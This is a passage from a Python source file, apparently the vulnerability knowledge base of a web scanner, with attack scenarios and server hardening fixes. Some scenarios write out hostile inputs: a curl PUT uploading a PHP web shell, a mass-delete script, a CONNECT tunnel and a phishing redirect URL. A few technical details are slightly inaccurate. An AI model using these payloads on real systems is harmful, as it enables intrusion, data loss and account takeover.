        "`config.json`, `config.yaml`, `config.yml`, `settings.json`\n"
        "2. `config.json` returns `{\"api_url\": "
        "\"https://api-staging.internal/v1\", \"debug\": true, "
        "\"feature_flags\": {\"experimental_login\": true}}`\n"
        "3. Attacker accesses the staging API directly — it has "
        "`debug=true` and weaker authentication\n"
        "4. Staging API exposes the experimental_login endpoint, which "
        "accepts any password for new accounts\n"
        "5. Attacker creates an admin account on the application"
    ),
    "impact": (
        "Information disclosure of internal endpoints, feature flags, and "
        "sometimes credentials. Staging and admin URLs disclosed in "
        "config files are frequent attack surfaces — they often have "
        "weaker security controls than production. Feature flags "
        "disclosed in client config can also enable abuse of "
        "non-public features."
    ),
    "remediation": [
        "Block common config filenames at the web server: "
        "`location ~* /(config\\.(json|ya?ml|ini)|settings\\.json) { deny all; }`.",
        "If the config must be client-readable, serve only the minimum "
        "fields needed (use a separate `public-config.json` endpoint).",
        "Never include secrets, internal URLs, or debug toggles in "
        "client-readable config files.",
        "Move secrets to server-side environment variables, accessed "
        "via authenticated APIs when needed.",
    ],
    "code_examples": {
        "nginx": (
            "location ~* /(config\\.(json|ya?ml|ini)|settings\\.json|appsettings\\.json) {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}"
        ),
        "apache": (
            "<FilesMatch \"\\.(json|ya?ml|ini)$\">\n"
            "    <If \"%{REQUEST_URI} =~ m#/config\\.#\">\n"
            "        Require all denied\n"
            "    </If>\n"
            "</FilesMatch>"
        ),
        "express": (
            "const BLOCKED = /\\/(config|settings)\\.(json|ya?ml|ini)$/i;\n"
            "app.use((req, res, next) => {\n"
            "  if (BLOCKED.test(req.path)) return res.status(404).end();\n"
            "  next();\n"
            "});"
        ),
        "vite_react": (
            "// Vite: only public-prefixed vars are exposed to client\n"
            "// .env.production\n"
            "VITE_API_URL=https://api.example.com  // safe\n"
            "DB_PASS=hunter2  // NOT exposed to client — never VITE_-prefixed"
        ),
        "build_check": (
            "# Audit your public/ directory for accidental config:\n"
            "ls public/*.json public/*.yml 2>/dev/null"
        ),
    },
}

DISCLOSURE_BACKUP_FILE: VulnEntry = {
    "summary": (
        "Editor or backup files are publicly accessible "
        "(`/.env.bak`, `/app.py.bak`, `/index.php~`, `/.htaccess.bak`). "
        "These files often contain the full source code or configuration "
        "of the application in a form an attacker can read directly with "
        "a simple GET request — equivalent to exposing the entire source "
        "tree of the live service."
    ),
    "technical": (
        "Editors create backup files automatically: Vim `~` suffixes, "
        "Emacs `#file#` patterns, backup `.bak` extensions. IDEs like "
        "PyCharm create `*.py.bak`. TextMate creates `_old.php`. These "
        "files persist if the developer does not clean them up before "
        "deployment. Deployment tools sometimes leave them in place. "
        "The contents are typically the same as the live file — full "
        "source code disclosure."
    ),
    "attack_scenario": (
        "1. Attacker requests `/app.py.bak` (common wordlist entry)\n"
        "2. Server returns the full Flask app source\n"
        "3. Attacker reads the source: finds hard-coded `ADMIN_TOKEN = "
        "\"abc123\"` and an unguarded `/api/admin/reset` endpoint\n"
        "4. Attacker POSTs to `/api/admin/reset` with the token — "
        "resets the production database\n"
        "5. Application is now in an attacker-controlled state"
    ),
    "impact": (
        "Full source code disclosure — same impact as exposed `.git`. "
        "Backup files often contain credentials, internal endpoints, "
        "and debug code that did not make it into the deployed version "
        "but reveal the application's logic. Attackers frequently find "
        "passwords in `wp-config.php.bak` and similar files."
    ),
    "remediation": [
        "Block all backup/editor suffixes at the web server: "
        "`location ~* \\.(bak|old|orig|swp|~)$ { deny all; }`",
        "Add editor backup exclusions to your `.gitignore` and deploy "
        "exclusions to your deploy script.",
        "Run a CI check that scans the deploy artifact for `*\\.bak`, "
        "`*~`, `*.swp` files.",
        "Use editor/IDE settings that disable automatic backups in "
        "project directories (vim: `set nobackup nowritebackup`).",
    ],
    "code_examples": {
        "nginx": (
            "location ~* \\.(bak|old|orig|swp|~|save|swx)$ {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}"
        ),
        "apache": (
            "<FilesMatch \"\\.(bak|old|orig|swp|~)$\">\n"
            "    Require all denied\n"
            "</FilesMatch>"
        ),
        "vim": (
            "# ~/.vimrc\n"
            "set nobackup\n"
            "set nowritebackup"
        ),
        "ci_check": (
            "# In CI:\n"
            "find public/ src/ -name '*.bak' -o -name '*~' -o -name '*.swp' | head"
        ),
        "deployment": (
            "rsync -av \\\n"
            "  --exclude='*.bak' --exclude='*~' --exclude='*.swp' \\\n"
            "  --exclude='*.pyc' --exclude='__pycache__' \\\n"
            "  ./ /var/www/html/"
        ),
    },
}

# ---------------------------------------------------------------------------
# http-methods
# ---------------------------------------------------------------------------

METHODS_TRACE_ENABLED: VulnEntry = {
    "summary": (
        "The HTTP TRACE method is enabled. TRACE echoes the client's "
        "request — including headers like Cookie and Authorization — back "
        "in the response body. Combined with a same-origin XHR, an "
        "attacker can read headers that JavaScript normally cannot "
        "access (Cross-Site Tracing, XST)."
    ),
    "technical": (
        "RFC 7231 defines TRACE for diagnostic purposes: the server "
        "echoes the received request back to the client. Most servers "
        "disable it for security reasons, but some still enable it. "
        "Browser XHR has traditionally been blocked from reading "
        "`Set-Cookie` and certain other headers. XST works around this "
        "by using TRACE: the attacker issues a same-origin TRACE request "
        "via XHR, and the response body contains the headers verbatim. "
        "Even if JavaScript cannot read the raw `Cookie` header directly, "
        "it can parse the TRACE response body. Modern browsers mitigate "
        "this with same-origin restrictions on TRACE, but TRACE-enabled "
        "servers are still a defense-in-depth gap."
    ),
    "attack_scenario": (
        "1. Attacker hosts https://evil.example\n"
        "2. JavaScript issues `fetch(target.example/api/me, {method: "
        "'TRACE'})` — or uses a Flash/Silverlight applet as a fallback "
        "for older browsers\n"
        "3. Server echoes the request, including the cookie header\n"
        "4. JavaScript parses the response body, extracts the session "
        "cookie\n"
        "5. Attacker exfiltrates the cookie and impersonates the victim"
    ),
    "impact": (
        "Session hijacking via XST. With TRACE enabled, attackers can "
        "read headers that JavaScript normally cannot access — bypassing "
        "the `HttpOnly` flag in some legacy browser combinations. The "
        "primary risk is for legacy browsers or environments where "
        "plugins (Flash, Silverlight, Java) can issue cross-origin "
        "requests that JavaScript cannot."
    ),
    "remediation": [
        "Disable TRACE on the web server. In Apache: "
        "`TraceEnable off`. In nginx: TRACE is disabled by default.",
        "In IIS: deny the TRACE verb via `Request Filtering`.",
        "For application frameworks: add a middleware that returns 405 "
        "for TRACE requests.",
        "Apply defense in depth: even if TRACE is enabled, mark session "
        "cookies `HttpOnly` so JavaScript cannot read them via any vector.",
    ],
    "code_examples": {
        "apache": "TraceEnable off",
        "nginx": "# TRACE is disabled by default — no config needed",
        "iis": (
            "<!-- web.config -->\n"
            "<system.webServer>\n"
            "  <security>\n"
            "    <requestFiltering>\n"
            "      <verbs>\n"
            "        <add verb=\"TRACE\" allowed=\"false\" />\n"
            "      </verbs>\n"
            "    </requestFiltering>\n"
            "  </security>\n"
            "</system.webServer>"
        ),
        "express": (
            "app.all('*', (req, res, next) => {\n"
            "  if (req.method === 'TRACE') return res.status(405).end();\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "@app.before_request\n"
            "def deny_trace():\n"
            "    if flask.request.method == 'TRACE':\n"
            "        return 'method not allowed', 405"
        ),
    },
}

METHODS_PUT_NO_AUTH: VulnEntry = {
    "summary": (
        "The PUT method is accepted on a public endpoint without "
        "authentication. PUT writes the request body to the server — "
        "with no auth check, any internet user can create or overwrite "
        "files on the server. Common exploit: upload a web shell to a "
        "directory served by the application."
    ),
    "technical": (
        "PUT is intended for uploading resources to a specific URI. "
        "When enabled without authentication on a web root or "
        "upload directory, an attacker can upload arbitrary content — "
        "including server-side scripts (PHP, ASP, JSP, CGI) that the "
        "server then executes. This is a recurring finding in "
        "misconfigured Apache `mod_dav`, IIS WebDAV, Flask "
        "`PUT-only-file-upload` patterns, and S3 buckets. The impact "
        "is remote code execution."
    ),
    "attack_scenario": (
        "1. Attacker runs `curl -X PUT "
        "https://target.example/uploads/shell.php -d '<?php "
        "system($_GET[\"c\"]); ?>'`\n"
        "2. Server accepts the PUT, writes shell.php to /uploads/\n"
        "3. Attacker visits "
        "`https://target.example/uploads/shell.php?c=id`\n"
        "4. Server executes the PHP — `uid=33(www-data) gid=33(www-data)`\n"
        "5. Attacker now has command execution as the web server user; "
        "privilege escalation to root is often the next step"
    ),
    "impact": (
        "Remote code execution in most cases. Even if PUT is restricted "
        "to a non-executable directory, an attacker can overwrite static "
        "assets, deface the site, plant phishing content, or fill the "
        "disk. The combination of unauthenticated PUT and executable "
        "extensions is a critical finding that should be patched "
        "immediately."
    ),
    "remediation": [
        "Disable PUT unless the application requires it. If required, "
        "authenticate every PUT request and restrict accepted content "
        "types and extensions.",
        "In Apache, disable WebDAV: `a2dismod dav dav_fs` and remove "
        "`DAV On` directives.",
        "In nginx, limit PUT to specific authenticated routes: "
        "`limit_except GET POST { deny all; }`.",
        "Never accept user-uploaded content with executable extensions "
        "(.php, .jsp, .cgi). Store uploads outside the document root "
        "and serve them via a separate authenticated download endpoint.",
    ],
    "code_examples": {
        "apache": (
            "# Disable WebDAV entirely:\n"
            "# a2dismod dav dav_fs\n"
            "# Remove any 'DAV On' from <Directory> blocks"
        ),
        "nginx": (
            "location / {\n"
            "    limit_except GET POST { deny all; }\n"
            "}"
        ),
        "iis": (
            "<!-- web.config -->\n"
            "<system.webServer>\n"
            "  <security>\n"
            "    <requestFiltering>\n"
            "      <verbs>\n"
            "        <add verb=\"PUT\" allowed=\"false\" />\n"
            "        <add verb=\"DELETE\" allowed=\"false\" />\n"
            "      </verbs>\n"
            "    </requestFiltering>\n"
            "  </security>\n"
            "</system.webServer>"
        ),
        "express": (
            "const app = express();\n"
            "app.use((req, res, next) => {\n"
            "  if (!['GET', 'POST'].includes(req.method)) {\n"
            "    return res.status(405).send('method not allowed');\n"
            "  }\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "# If using Flask, restrict upload route:\n"
            "@app.route('/upload', methods=['POST'])\n"
            "@login_required\n"
            "def upload():\n"
            "    f = flask.request.files['file']\n"
            "    if not f.filename.endswith(('.jpg', '.png')):\n"
            "        return 'invalid', 400"
        ),
    },
}

METHODS_DELETE_NO_AUTH: VulnEntry = {
    "summary": (
        "The DELETE method is accepted on a public endpoint without "
        "authentication. DELETE removes the resource at the URI. An "
        "attacker can delete arbitrary resources — files, records, "
        "user accounts — depending on how the endpoint is wired."
    ),
    "technical": (
        "DELETE is intended for removing a resource at a specific URI. "
        "When exposed without authentication, the endpoint pattern "
        "determines the impact: `/files/{id}` allows deleting any "
        "file by ID, `/users/{id}` allows deleting accounts, "
        "`/api/posts/{id}` allows deleting posts. If the URI uses an "
        "incrementing integer ID without auth (IDOR + DELETE), the "
        "attacker can wipe content en masse via a script."
    ),
    "attack_scenario": (
        "1. Attacker discovers DELETE is enabled on /api/posts/{id}\n"
        "2. Attacker scripts `for id in 1..10000: "
        "requests.delete(f\"https://target.example/api/posts/{id}\")`\n"
        "3. Server deletes every post matching those IDs\n"
        "4. Application's content is wiped — denial of service with "
        "permanent data loss\n"
        "5. If posts are customer reviews, this destroys trust; if "
        "they are records, this destroys the business"
    ),
    "impact": (
        "Mass data deletion, denial of service, permanent loss of "
        "content. If DELETE exposes admin actions (delete user, delete "
        "organization), the impact escalates to full account takeover "
        "of administrators (delete the admin's 2FA recovery, etc.). "
        "Even with backups, recovery time and reputational damage are "
        "significant."
    ),
    "remediation": [
        "Authenticate every DELETE request. Verify the authenticated "
        "user is authorized to delete the specific resource.",
        "Use authorization checks: an authenticated user can delete "
        "their own posts but not others'.",
        "Soft-delete instead of hard-delete: mark records as deleted "
        "rather than removing them; allow restoration.",
        "Rate-limit DELETE operations and emit alerts on bulk deletion.",
        "Require additional confirmation for destructive actions "
        "(re-authentication, MFA challenge).",
    ],
    "code_examples": {
        "nginx": (
            "location / {\n"
            "    limit_except GET POST { deny all; }\n"
            "}"
        ),
        "iis": (
            "<add verb=\"DELETE\" allowed=\"false\" />  # in requestFiltering"
        ),
        "express": (
            "app.delete('/api/posts/:id', requireAuth, async (req, res) => {\n"
            "  const post = await Post.findById(req.params.id);\n"
            "  if (post.authorId !== req.user.id && !req.user.isAdmin) {\n"
            "    return res.status(403).send('forbidden');\n"
            "  }\n"
            "  await post.softDelete();\n"
            "  res.status(204).end();\n"
            "});"
        ),
        "django": (
            "class PostDelete(LoginRequiredMixin, UserPassesTestMixin, DeleteView):\n"
            "    def test_func(self):\n"
            "        return self.get_object().author == self.request.user"
        ),
        "flask": (
            "@app.route('/api/posts/<int:id>', methods=['DELETE'])\n"
            "@login_required\n"
            "def delete_post(id):\n"
            "    post = Post.query.get_or_404(id)\n"
            "    if post.author != current_user and not current_user.is_admin:\n"
            "        return 'forbidden', 403\n"
            "    db.session.delete(post); db.session.commit()\n"
            "    return '', 204"
        ),
    },
}

METHODS_CONNECT_ENABLED: VulnEntry = {
    "summary": (
        "The HTTP CONNECT method is enabled on the public endpoint. "
        "CONNECT establishes a TCP tunnel through the server — used by "
        "HTTPS proxies but almost never legitimate on a public web "
        "endpoint. Attackers abuse it to relay arbitrary TCP traffic "
        "through the server, bypassing network controls."
    ),
    "technical": (
        "CONNECT is the standard method for HTTP proxies to set up "
        "tunnels for HTTPS traffic (so the proxy can see only the "
        "CONNECT request, not the encrypted body). When enabled on a "
        "non-proxy endpoint, an attacker can `CONNECT target.example:any "
        "` and use the server as an open relay to internal services. "
        "Even if the tunnel only connects outbound, this turns the "
        "server into a proxy — useful for bypassing egress firewalls "
        "or hiding the attacker's IP."
    ),
    "attack_scenario": (
        "1. Attacker runs `curl -X CONNECT target.example:8080 "
        "-p 8080 -P https://internal.target.example`\n"
        "2. Target establishes a TCP tunnel to internal.target.example\n"
        "3. Attacker uses the tunnel to access internal services that "
        "should not be reachable from the internet\n"
        "4. Attacker exfiltrates data, scans internal networks, or "
        "attacks internal-only services\n"
        "5. The attack originates from target.example — masking the "
        "attacker's IP"
    ),
    "impact": (
        "Open proxy, internal network exposure, IP masking for further "
        "attacks. CONNECT-enabled endpoints are routinely abused by "
        "spammers and attackers as open proxies; some security teams "
        "automatically blacklist IPs found running open CONNECT relays. "
        "For the targeted organization, the immediate impact is that "
        "the server becomes a stepping stone for attacks against "
        "internal infrastructure."
    ),
    "remediation": [
        "Disable CONNECT unless the server is a documented HTTP proxy. "
        "In Apache: `RewriteEngine On; RewriteCond %{REQUEST_METHOD} "
        "=CONNECT; RewriteRule .* - [F]`. In nginx: `if ($request_method "
        "= CONNECT) { return 405; }`.",
        "If you run a proxy, restrict CONNECT to specific destination "
        "hostnames; never allow arbitrary targets.",
        "Monitor proxy logs for abuse and implement rate limits.",
        "Add the server's IP to external proxy-block lists if it has "
        "been abused (Spamhaus, etc.).",
    ],
    "code_examples": {
        "apache": (
            "RewriteEngine On\n"
            "RewriteCond %{REQUEST_METHOD} =CONNECT\n"
            "RewriteRule .* - [F,L]"
        ),
        "nginx": (
            "server {\n"
            "    if ($request_method = CONNECT) {\n"
            "        return 405;\n"
            "    }\n"
            "    # ... or use limit_except for a specific location\n"
            "    location / {\n"
            "        limit_except GET POST { deny all; }\n"
            "    }\n"
            "}"
        ),
        "iis": (
            "<add verb=\"CONNECT\" allowed=\"false\" />  # in requestFiltering"
        ),
        "express": (
            "app.use((req, res, next) => {\n"
            "  if (req.method === 'CONNECT') return res.status(405).end();\n"
            "  next();\n"
            "});"
        ),
        "generic": (
            "# If you ARE a proxy, restrict CONNECT destinations:\n"
            "AllowConnect 443  # squid: only CONNECT to port 443"
        ),
    },
}

METHODS_ADVERTISED: VulnEntry = {
    "summary": (
        "The `Allow` response header advertises a dangerous HTTP method "
        "(PUT, DELETE, PATCH, TRACE, CONNECT). Even if the method is "
        "rejected on direct request (405), advertising it in `Allow` "
        "leaks the server's intent and may indicate a misconfigured "
        "reverse proxy."
    ),
    "technical": (
        "RFC 7231 defines `Allow` as the list of methods supported by "
        "the resource. Many frameworks and servers auto-generate it "
        "from the registered routes or handlers. A method that returns "
        "405 on direct request but is listed in `Allow` typically "
        "indicates a route was registered (perhaps for an admin tool) "
        "but never properly gated. The advertised method is a direct "
        "hint to attackers about what to try next."
    ),
    "attack_scenario": (
        "1. Attacker runs OPTIONS against /api/admin\n"
        "2. Response: `Allow: GET, POST, PUT, DELETE`\n"
        "3. Attacker tries PUT /api/admin — gets 401 (auth required), "
        "not 405 (not allowed)\n"
        "4. Attacker knows PUT is a real method on this resource — "
        "just needs auth bypass\n"
        "5. Attacker focuses efforts on finding credentials or "
        "session-hijacking path, rather than wasting time on "
        "non-existent methods"
    ),
    "impact": (
        "Reconnaissance disclosure. The advertised method list tells "
        "an attacker exactly which methods to test, narrowing their "
        "search. Even when the method is locked down (405), the "
        "advertisement indicates the framework or reverse proxy was "
        "configured with that method in mind — a configuration smell "
        "that suggests broader security review is warranted."
    ),
    "remediation": [
        "Strip the `Allow` header from responses unless explicitly "
        "required by your API contract.",
        "Disable dangerous methods at the framework level — even if "
        "the route returns 405, do not register the handler.",
        "Audit `Allow` responses for any method you do not intend to "
        "support.",
        "Use a reverse proxy to filter methods before they reach the "
        "application: `limit_except GET POST { deny all; }`.",
    ],
    "code_examples": {
        "nginx": (
            "location / {\n"
            "    limit_except GET POST { deny all; }\n"
            "    # OR strip the Allow header:\n"
            "    proxy_hide_header Allow;\n"
            "}"
        ),
        "apache": (
            "Header unset Allow\n"
            "# Or restrict methods:\n"
            "<LimitExcept GET POST>\n"
            "    Require all denied\n"
            "</LimitExcept>"
        ),
        "express": (
            "const allowed = new Set(['GET', 'POST']);\n"
            "app.use((req, res, next) => {\n"
            "  if (!allowed.has(req.method)) return res.status(405).end();\n"
            "  next();\n"
            "});\n"
            "// And don't expose the Allow header in your framework config"
        ),
        "flask": (
            "# Don't advertise Allow unless required:\n"
            "@app.after_request\n"
            "def strip_allow(resp):\n"
            "    resp.headers.pop('Allow', None)\n"
            "    return resp"
        ),
        "iis": (
            "<verbs>\n"
            "  <add verb=\"PUT\" allowed=\"false\" />\n"
            "  <add verb=\"DELETE\" allowed=\"false\" />\n"
            "  <add verb=\"TRACE\" allowed=\"false\" />\n"
            "  <add verb=\"CONNECT\" allowed=\"false\" />\n"
            "</verbs>"
        ),
    },
}

# ---------------------------------------------------------------------------
# open-redirect-indicator
# ---------------------------------------------------------------------------

OPEN_REDIRECT_PARAM: VulnEntry = {
    "summary": (
        "An endpoint accepts a redirect-target parameter (`next`, `url`, "
        "`redirect`, `return`, `goto`, etc.) without server-side "
        "validation. If exploited, an attacker can craft a link on the "
        "trusted domain that redirects victims to a phishing or malware "
        "site — bypassing URL filters and user trust signals."
    ),
    "technical": (
        "Open redirects exploit authentication flows that use a "
        "`returnTo` or `next` parameter after login. The application "
        "redirects to whatever URL the user supplies, with no validation. "
        "Because the initial URL is on the trusted domain, link "
        "previewers and email scanners see only the trusted host. The "
        "victim clicks, is briefly redirected to the trusted domain, then "
        "sent to the attacker's site. Open redirects are routinely used "
        "in OAuth flows to hijack authorization codes, in phishing "
        "campaigns to make links look legitimate, and in tab-nabbing "
        "scenarios."
    ),
    "attack_scenario": (
        "1. Attacker crafts "
        "`https://target.example/login?next=https://evil.example/fake-login`\n"
        "2. Attacker distributes the link: "
        "'Click here to verify your account on target.example'\n"
        "3. Victim clicks, lands on target.example's real login page, "
        "enters credentials, gets redirected to evil.example\n"
        "4. evil.example renders a target.example lookalike saying "
        "'Session expired, please re-enter your password'\n"
        "5. Victim enters credentials — captured by attacker\n"
        "6. Attacker uses credentials to log in to the real "
        "target.example — account takeover"
    ),
    "impact": (
        "Phishing leverage: any link on the trusted domain can land the "
        "victim on an attacker-controlled page. OAuth flow abuse: if the "
        "OAuth `redirect_uri` is not validated, the attacker captures "
        "the authorization code. Tab-nabbing: a link opened in a new "
        "tab can rewrite the original tab via window.opener. The "
        "combination with OAuth is the most damaging — full account "
        "takeover via stolen authorization code."
    ),
    "remediation": [
        "Validate redirect targets against an allowlist of internal "
        "paths (e.g. only redirect to paths starting with `/` on your "
        "own domain).",
        "Use signed/encrypted tokens for redirect targets so the URL "
        "itself cannot be modified by an attacker.",
        "If external redirects are needed, present an interstitial page "
        "warning the user they are leaving the trusted domain.",
        "For OAuth, validate `redirect_uri` strictly — only allow "
        "pre-registered URIs; reject wildcards and partial matches.",
    ],
    "code_examples": {
        "flask": (
            "from urllib.parse import urlparse\n"
            "ALLOWED_HOSTS = {'target.example.com'}\n"
            "@app.route('/login')\n"
            "def login():\n"
            "    next_url = request.args.get('next', '/')\n"
            "    p = urlparse(next_url)\n"
            "    if p.scheme or p.netloc:  # absolute URL — reject\n"
            "        return 'invalid redirect', 400\n"
            "    if not next_url.startswith('/'):\n"
            "        next_url = '/' + next_url\n"
            "    return redirect(next_url)"
        ),
        "django": (
            "from django.utils.http import url_has_allowed_host_and_scheme\n"
            "def safe_redirect(request):\n"
            "    nxt = request.GET.get('next', '/')\n"
            "    if url_has_allowed_host_and_scheme(nxt, "
            "allowed_hosts={request.get_host()}, require_https=request.is_secure()):\n"
            "        return redirect(nxt)\n"
            "    return redirect('/')"
        ),
        "express": (
            "function safeRedirect(req, res, next) {\n"
            "  const nxt = req.query.next || '/';\n"
            "  if (/^\\/[\\w/-]*$/.test(nxt)) {\n"
            "    return res.redirect(nxt);\n"
            "  }\n"
            "  return res.redirect('/');\n"
            "}"
        ),
        "oauth": (
            "# OAuth: validate redirect_uri strictly\n"
            "ALLOWED_REDIRECTS = {'https://app.example.com/callback'}\n"
            "if redirect_uri not in ALLOWED_REDIRECTS:\n"
            "    return error('invalid redirect_uri')"
        ),
        "interstitial": (
            "# If external redirects must be allowed, use an interstitial:\n"
            "<a href=\"/leave?u=https://external.example\">Leave site</a>\n"
            "# /leave renders: 'You are about to visit https://external.example'"
        ),
    },
}

# ---------------------------------------------------------------------------
# source-map-exposure
# ---------------------------------------------------------------------------

SOURCE_MAP_EXPOSED: VulnEntry = {
    "summary": (
        "A JavaScript source map file (`*.js.map`) is publicly "
        "accessible. Source maps translate minified production code back "
        "to the original source — including comments, internal variable "
        "names, and unreleased features. An attacker who fetches the map "
        "sees your application as if it were open source."
    ),
    "technical": (
        "Modern build tools (Webpack, Vite, esbuild, Rollup) generate "
        "source maps by default. They map positions in the minified "
        "production bundle back to lines in the original TypeScript or "
        "JavaScript. The `sourcesContent` array in the map contains the "
        "full original source. When deployed, attackers fetch the map "
        "and reconstruct comments, function names, dead code paths, "
        "and internal API URLs. Source maps should never be deployed to "
        "production — they should only be uploaded to error-tracking "
        "services (Sentry, Bugsnag) for stack-trace symbolication."
    ),
    "attack_scenario": (
        "1. Attacker loads the application, opens DevTools, finds "
        "`/static/js/main.bundle.js`\n"
        "2. Attacker fetches `/static/js/main.bundle.js.map` — "
        "returns 200 OK\n"
        "3. Attacker reads the `sourcesContent` array — full "
        "original TypeScript source\n"
        "4. Attacker finds comments like "
        "`// TODO: remove admin backdoor in v2.5`, internal "
        "endpoint URLs (`/api/internal/users`), hard-coded test "
        "credentials, or feature flags for unreleased features\n"
        "5. Attacker exploits the discovered information — calls "
        "the internal endpoint, uses the credentials, or accesses "
        "an unfinished feature"
    ),
    "impact": (
        "Full source code disclosure of the JavaScript bundle. While "
        "the minified code is already public (the bundle ships to "
        "every browser), the source map adds comments, variable names, "
        "and internal structure. Common leaks: API keys committed by "
        "developers, internal-only endpoints, hard-coded test "
        "credentials, comments referencing planned security controls "
        "or known issues. For applications with TypeScript types, the "
        "map can reveal the entire type system."
    ),
    "remediation": [
        "Do not deploy source maps to production. In Webpack: "
        "`devtool: 'hidden-source-map'` uploads the map to your error "
        "tracker but does not reference it from the bundle.",
        "Or strip the `sourceMappingURL` comment from the production "
        "output: `devtool: false` or use `TerserPlugin` with "
        "`sourceMap: false`.",
        "Block `.map` files at the web server: "
        "`location ~* \\.map$ { deny all; return 404; }`.",
        "If source maps must be accessible for debugging, restrict "
        "access via authentication or a private CDN accessible only "
        "to your error-tracking service.",
    ],
    "code_examples": {
        "webpack": (
            "// webpack.config.js\n"
            "module.exports = {\n"
            "  // Production: do not bundle source map into output\n"
            "  devtool: false,\n"
            "  // Or: upload to Sentry without serving to clients\n"
            "  devtool: 'hidden-source-map',\n"
            "  plugins: [new SentryWebpackPlugin({ ... })],\n"
            "};"
        ),
        "vite": (
            "// vite.config.ts\n"
            "export default defineConfig({\n"
            "  build: {\n"
            "    sourcemap: false,  // or 'hidden' for error tracker only\n"
            "  }\n"
            "});"
        ),
        "nginx": (
            "location ~* \\.map$ {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}"
        ),
        "apache": (
            "<FilesMatch \"\\.map$\">\n"
            "    Require all denied\n"
            "</FilesMatch>"
        ),
        "express": (
            "app.use((req, res, next) => {\n"
            "  if (/\\.map$/.test(req.path)) return res.status(404).end();\n"
            "  next();\n"
            "});"
        ),
    },
}

INLINE_SOURCE_MAP_REF: VulnEntry = {
    "summary": (
        "A JavaScript bundle contains an inline `sourceMappingURL` "
        "comment pointing to a `.map` file. Even if the bundle does not "
        "expose the map directly, the comment tells an attacker exactly "
        "where to look. If the map file is accessible (or has been "
        "mirrored elsewhere), the original source code is recoverable."
    ),
    "technical": (
        "Modern bundlers append a comment to the end of minified "
        "JavaScript: `//# sourceMappingURL=main.bundle.js.map`. This "
        "tells browser devtools where to fetch the source map for "
        "debugging. While the comment is harmless on its own, it "
        "leaks the map filename and location. An attacker fetches the "
        "referenced URL; if accessible (200 OK), the source is "
        "disclosed. If the map is not accessible, the comment is "
        "still a hint that an internal build artifact exists at that "
        "path — useful for targeting later."
    ),
    "attack_scenario": (
        "1. Attacker fetches `https://target.example/static/js/main.bundle.js`\n"
        "2. Last line of the file: "
        "`//# sourceMappingURL=main.bundle.js.map`\n"
        "3. Attacker fetches "
        "`https://target.example/static/js/main.bundle.js.map` — "
        "returns 200 OK with valid JSON\n"
        "4. Attacker parses the `sourcesContent` array — full "
        "TypeScript source\n"
        "5. Same impact as a directly exposed map (see "
        "SOURCE_MAP_EXPOSED entry)"
    ),
    "impact": (
        "Equivalent to exposed source map if the referenced file is "
        "accessible. Even if the map is currently inaccessible, the "
        "inline comment serves as a permanent hint to attackers — and "
        "future deployments may accidentally expose the map (e.g. CDN "
        "misconfiguration, new deploy script that uploads everything "
        "in /static/). Best practice: never emit a sourceMappingURL "
        "comment in production."
    ),
    "remediation": [
        "Configure your bundler to NOT emit the sourceMappingURL "
        "comment in production. In Webpack: `devtool: 'hidden-source-map'`. "
        "In Vite: `sourcemap: 'hidden'`.",
        "Strip the comment in a build step: use `TerserPlugin` with "
        "`sourceMap: false` or a regex post-processor.",
        "Block `.map` files at the web server as a defense-in-depth "
        "measure.",
        "Audit your build pipeline — if the sourceMappingURL comment "
        "is present in production bundles, the bundler is configured "
        "incorrectly.",
    ],
    "code_examples": {
        "webpack": (
            "// webpack.config.js\n"
            "module.exports = {\n"
            "  devtool: 'hidden-source-map',  // emits .map but no URL comment\n"
            "  // OR for none:\n"
            "  devtool: false,\n"
            "};"
        ),
        "vite": (
            "// vite.config.ts\n"
            "export default defineConfig({\n"
            "  build: { sourcemap: 'hidden' }  // or false\n"
            "});"
        ),
        "post_process": (
            "# Strip sourceMappingURL comments post-build:\n"
            "find dist -name '*.js' -exec sed -i '/sourceMappingURL/d' {};\n"
            "# Or with Terser:\n"
            "TerserPlugin({ terserOptions: { sourceMap: false, output: "
            "{ comments: false } } })"
        ),
        "nginx": (
            "location ~* \\.map$ {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}"
        ),
        "express": (
            "// Express: serve only hashed bundles, never .map files\n"
            "app.use(express.static('public', { setHeaders: (res, path) => {\n"
            "  if (path.endsWith('.map')) res.status(404).end();\n"
            "}}));"
        ),
    },
}


# ---------------------------------------------------------------------------
# Active checks (Phase 4)
# ---------------------------------------------------------------------------

XSS_REFLECTED: VulnEntry = {
    "summary": (
        "A parameter reflects user input unescaped into the response body. "
        "An attacker can craft a URL that executes arbitrary JavaScript in "
        "the victim's browser, in the security context of the target origin. "
        "This leads to session hijacking, credential theft, or phishing."
    ),
    "technical": (
        "Reflected XSS occurs when a request parameter is included in the "
        "HTML response without proper encoding. The browser's HTML parser "
        "interprets attacker-controlled markup. Because the victim loads the "
        "URL on the trusted origin, the attacker's script runs with full "
        "access to the target's cookies, localStorage, and DOM. Modern "
        "browsers' `HttpOnly` flag limits cookie theft but not all impact: "
        "the script can still perform any action the user can perform — "
        "make API calls, transfer funds, change account settings."
    ),
    "attack_scenario": (
        "1. Attacker discovers the parameter `q` is reflected unescaped at "
        "`https://target.example/search?q=redveilXSSProbe12345`\n"
        "2. Attacker crafts a URL with a JavaScript payload (using the same "
        "canary-based detection redveil performs, the attacker upgrades to "
        "an executable payload)\n"
        "3. Attacker distributes the link: 'Search your invoice on "
        "target.example' (link points to the XSS URL)\n"
        "4. Victim clicks, the script runs in target.example's origin, "
        "reads `document.cookie` and POSTs it to attacker's server\n"
        "5. Attacker replays the cookie — account takeover\n\n"
        "Note: redveil's `xss-reflected` check uses BENIGN canary strings "
        "(`redveilXSSProbe12345`, no `<script>` tag) — the proof of "
        "vulnerability is that the canary appears unescaped in the response, "
        "not that the canary executes."
    ),
    "impact": (
        "Session hijacking (steal session cookies, even with HttpOnly, via "
        "XHR exfil). Credential theft (render a fake login form). Keylogging. "
        "Cryptomining in the victim's browser. Defacement. Phishing — the "
        "trusted domain shows attacker-controlled content."
    ),
    "remediation": [
        "HTML-encode ALL user input reflected in HTML responses: use a "
        "template engine with auto-escaping (Jinja2, Twig, Handlebars).",
        "Set `Content-Security-Policy: default-src 'self'` to block inline "
        "scripts and remote script loads.",
        "Set `X-Content-Type-Options: nosniff` to prevent MIME-type confusion.",
        "For URL parameters, use strict allowlists rather than trying to "
        "encode unsafe characters.",
    ],
